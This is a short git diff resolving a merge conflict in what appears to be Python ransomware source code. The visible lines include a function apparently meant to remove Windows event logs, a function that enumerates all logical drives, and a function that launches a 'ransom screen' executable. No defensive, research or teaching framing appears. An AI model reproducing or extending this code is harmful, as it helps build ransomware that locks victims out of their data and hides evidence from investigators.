@@ -86,8 +86,6 @@ def attempt_rem_event_logs():
         if result.returncode != 0: 
             pass
 
-<<<<<<< HEAD
-=======
 # Gather all drives used inside system
 def gather_all_drives():
     drives = win32api.GetLogicalDriveStrings()
@@ -99,7 +97,6 @@ def gather_all_drives():
     return drives
 
 # Launch ransom screen (as .exe format)
->>>>>>> 84f892d23335a13804846f75a5001e0d895cf719
 def launch_gui():
     path = os.path.join(os.getcwd(), "Screen.exe")
     subprocess.Popen([path])
